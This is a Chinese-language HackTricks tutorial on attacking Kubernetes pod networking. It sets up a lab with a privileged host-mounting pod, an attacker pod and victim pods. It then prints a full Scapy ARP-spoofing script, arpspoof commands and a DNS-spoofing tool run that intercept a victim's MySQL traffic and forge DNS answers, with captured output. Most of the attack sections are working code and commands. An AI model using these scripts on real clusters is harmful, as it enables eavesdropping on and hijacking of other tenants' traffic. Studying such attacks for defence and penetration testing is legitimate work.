# Kubernetes网络攻击

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 介绍

Kubernetes默认情况下会将**在同一节点上运行的所有容器**（即使它们属于不同的命名空间）连接到**第2层**（以太网）。这使得恶意容器可以对同一节点上的容器进行**ARP欺骗攻击**并捕获其流量。

在这个场景中，将创建4台机器：

* ubuntu-pe：特权机器，用于逃逸到节点并检查指标（攻击不需要）
* **ubuntu-attack**：默认命名空间中的**恶意**容器
* **ubuntu-victim**：kube-system命名空间中的**受害者**机器
* **mysql**：默认命名空间中的**受害者**机器
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## 基本的Kubernetes网络

如果您想了解更多关于这里介绍的网络主题的详细信息，请参考参考资料。

### ARP

一般来说，**节点内的Pod之间的网络**可以通过一个连接所有Pod的**桥接器**来实现。这个桥接器被称为“**cbr0**”。（某些网络插件会安装自己的桥接器。）**cbr0也可以处理ARP**（地址解析协议）解析。当一个传入的数据包到达cbr0时，它可以使用ARP解析目标MAC地址。

这个事实意味着，默认情况下，**在同一个节点上运行的每个Pod**都可以以以太网层（第2层）的方式与同一节点中的任何其他Pod进行通信（与命名空间无关）。

{% hint style="warning" %}
因此，**在同一节点的Pod之间可以进行ARP欺骗攻击**。
{% endhint %}

### DNS

在Kubernetes环境中，通常会在kube-system命名空间中运行1个（或多个）**DNS服务**：
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
在前面的信息中，你可以看到一些有趣的内容，**服务的IP地址**是**10.96.0.10**，但运行该服务的**Pod的IP地址**是**172.17.0.2**。

如果你检查任何Pod内部的DNS地址，你会发现类似以下内容：
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
然而，该pod**不知道**如何访问该**地址**，因为此情况下的pod范围是172.17.0.10/26。

因此，该pod将发送**DNS请求到地址10.96.0.10**，该地址将由cbr0**转换为**172.17.0.2。

{% hint style="warning" %}
这意味着，即使DNS服务器位于与pod相同的子网中，pod的**DNS请求**也将始终通过**桥接**来**转换**服务IP为端点IP。

了解到这一点，并且知道**ARP攻击是可能的**，节点中的**pod**将能够**拦截子网中每个pod**与**桥接**之间的流量，并**修改**来自DNS服务器的**DNS响应**（DNS欺骗）。

此外，如果**DNS服务器**位于**攻击者所在的节点**上，攻击者可以**拦截集群中任何pod的所有DNS请求**（在DNS服务器和桥接之间）并修改响应。
{% endhint %}

## 在同一节点的pod中进行ARP欺骗

我们的目标是**至少窃取ubuntu-victim到mysql的通信**。

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoof是一种网络攻击技术，它利用ARP协议的漏洞来欺骗网络中的主机。通过发送虚假的ARP响应，攻击者可以将自己伪装成网络中的其他主机，从而截取或篡改网络流量。

#### 攻击原理

ARP（Address Resolution Protocol）是一种用于将IP地址映射到物理MAC地址的协议。在一个局域网中，主机之间通信时需要知道目标主机的MAC地址。为了获取目标主机的MAC地址，发送方主机会发送一个ARP请求广播，询问目标主机的MAC地址。目标主机收到请求后，会发送一个ARP响应，包含自己的MAC地址。

ARPSpoof攻击利用了ARP协议的这个过程中的漏洞。攻击者发送虚假的ARP响应，欺骗发送方主机将其MAC地址与目标主机的IP地址进行映射。这样，发送方主机会将所有发送给目标主机的流量发送到攻击者的机器上。攻击者可以通过这种方式截取或篡改网络流量。

#### 攻击步骤

1. 启用IP转发：在攻击者的机器上，需要启用IP转发功能，以便将流量转发到正确的目标主机。

2. 欺骗目标主机：攻击者发送虚假的ARP响应，将自己的MAC地址与目标主机的IP地址进行映射。

3. 欺骗发送方主机：攻击者发送虚假的ARP响应，将自己的MAC地址与发送方主机的IP地址进行映射。

4. 捕获流量：攻击者的机器上会收到发送给目标主机的所有流量。

#### 防御措施

要防止ARPSpoof攻击，可以采取以下措施：

- 使用静态ARP表：在网络中配置静态ARP表，将IP地址与MAC地址进行绑定，防止攻击者发送虚假的ARP响应。

- 使用ARP防火墙：配置ARP防火墙，只允许已知的MAC地址与IP地址进行通信。

- 使用加密通信：使用加密协议（如HTTPS）来保护网络流量，防止被截取或篡改。

- 监控网络流量：定期监控网络流量，检测异常的ARP请求和响应。

- 更新操作系统和网络设备：及时更新操作系统和网络设备的补丁，修复已知的ARP漏洞。

ARPSpoof攻击是一种常见的网络攻击技术，了解其原理和防御措施对于保护网络安全至关重要。
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS欺骗

正如之前提到的，如果你**入侵了与DNS服务器Pod相同节点的Pod**，你可以通过**ARP欺骗**来**中间人攻击**桥接和DNS Pod，并**修改所有的DNS响应**。

你可以在[**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)找到一个非常好的**工具**和**教程**来测试这个攻击。

在我们的场景中，**下载**这个**工具**到攻击者的Pod中，并创建一个名为`hosts`的文件，其中包含你想要**欺骗**的**域名**，例如：
```
cat hosts
google.com. 1.1.1.1
```
执行对ubuntu-victim机器的攻击：
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
如果您尝试创建自己的DNS欺骗脚本，如果**仅修改DNS响应**，那是**行不通的**，因为**响应**将具有恶意**pod**的IP地址，而不会被接受。\
您需要生成一个具有受害者发送DNS请求的DNS的**源IP**的**新DNS数据包**（类似于172.16.0.2，而不是10.96.0.10，这是K8s DNS服务IP而不是DNS服务器IP，有关此内容的更多信息，请参见介绍）。
{% endhint %}

## 捕获流量

工具[**Mizu**](https://github.com/up9inc/mizu)是一个简单而强大的用于Kubernetes的API流量查看器，可以帮助您查看微服务之间的所有API通信，以帮助您调试和排查回归问题。\
它将在所选的pod中安装代理并收集其流量信息，并在Web服务器中显示给您。但是，您需要高级K8s权限（而且它不太隐蔽）。

## 参考资料

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您希望在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧**。

</details>
